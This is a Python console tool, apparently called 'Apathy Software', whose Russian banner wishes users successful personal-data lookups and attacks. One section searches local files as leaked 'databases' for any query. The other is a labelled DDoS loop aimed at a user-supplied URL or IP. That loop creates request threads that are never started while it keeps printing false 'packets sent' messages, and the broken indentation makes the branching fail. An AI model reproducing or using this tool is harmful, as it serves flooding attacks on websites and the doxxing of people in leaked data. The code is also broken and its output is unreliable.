from pystyle import *
import colorama 
from colorama import Fore
import time
from banner import banner 
from ddos import ddos 
from search import search

Green = Fore.GREEN 
White = Fore.WHITE 
Reset = Fore.RESET

#Тут не будет кода ес чо

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

def print_with_delay(text, delay=0.1):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()
    
print_with_delay("Добро пожаловать в Apathy Software удачного пробива и атак!")

print(Colorate.Horizontal(Colors.green_to_white,Center.XCenter(banner)))
section = input(f'{COLOR_CODE["GREEN"]}[𓁿]{COLOR_CODE["BOLD"]} Выберите раздел > {COLOR_CODE["YELLOW"]} ')

if section == "1":
    import os
import csv
import openpyxl
import logging
import chardet
from datetime import datetime, timedelta
from colorama import init, Fore, Style
from pystyle import *

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

init(autoreset=True)

logging.basicConfig(level=logging.INFO)


FILES_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
files_to_load = [f for f in os.listdir(FILES_FOLDER) if f.endswith(('.txt', '.csv', '.xlsx'))]

user_last_message_time = {}
flood_timeout = timedelta(seconds=5)  

print(Colorate.Horizontal(Colors.green_to_white,Center.XCenter(search)))

def search_in_file(file_path, file, query):
    results = []
    try:
        if file.endswith('.txt'):
            with open(file_path, 'rb') as f:
                raw_data = f.read()
                result = chardet.detect(raw_data)
                encoding = result['encoding']
            with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                for line in f:
                    if query in line:
                        results.append((file, line.strip()))
        elif file.endswith('.csv'):
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                for row in reader:
                    if any(query in str(cell) for cell in row):
                        results.append((file, row))
        elif file.endswith('.xlsx'):
            workbook = openpyxl.load_workbook(file_path, read_only=True)
            sheet = workbook.active
            for row in sheet.iter_rows(values_only=True):
                if any(query in str(cell) for cell in row):
                    results.append((file, row))
    except Exception as e:
        logging.error(f"Ошибка при обработке файла {file}: {e}")
    return results

def is_user_flooding(user_id):
    global user_last_message_time
    now = datetime.now()
    last_message_time = user_last_message_time.get(user_id, now - flood_timeout - timedelta(seconds=1))
    if now - last_message_time < flood_timeout:
        return True
    user_last_message_time[user_id] = now
    return False

def search_in_files(query):
    results = []
    for file in files_to_load:
        file_path = os.path.join(FILES_FOLDER, file)
        results.extend(search_in_file(file_path, file, query))
    return results

def print_results(results):
    if results:
        print(Fore.GREEN + "Найденная информация:\n")
        for file_name, result in results:
            print(Fore.GREEN + f"Название базы данных: {file_name}")
            print(Fore.WHITE + f"└  {', '.join(str(cell) for cell in result)}\n")
    else:
        print(Fore.RED + "К сожалению, в наших базах ничего не найдено.")

def main():
    user_id = "console_user"  # Для анти-флуда, если кто-то захочет сделать многоповторку

    while True:
        query = input(Fore.GREEN + "Введите запрос для поиска: ")
        
        if is_user_flooding(user_id):
            print(Fore.GREEN + "Пожалуйста, подождите немного перед тем, как отправлять следующий запрос.")
            continue
        
        results = search_in_files(query)
        print_results(results)

if __name__ == "__main__":
    main()

if section == "2":
    import colorama
import threading
import requests  # type: ignore

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}

print(Colorate.Horizontal(Colors.green_to_white,Center.XCenter(ddos)))

def make_request(url):
    response = requests.get(url)
    print(response.status_code)
    
url = input(f'{COLOR_CODE["GREEN"]}[𓁿]{COLOR_CODE["BOLD"]} Вставьте ссылку или айпи > {COLOR_CODE["YELLOW"]} ')

while True:
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
    print(f'{COLOR_CODE["GREEN"]}{COLOR_CODE["BOLD"]}Успешно отпрвленны пакеты на сайт: {COLOR_CODE["YELLOW"]}' +url)
    t = threading.Thread(target=make_request, args=(url,))
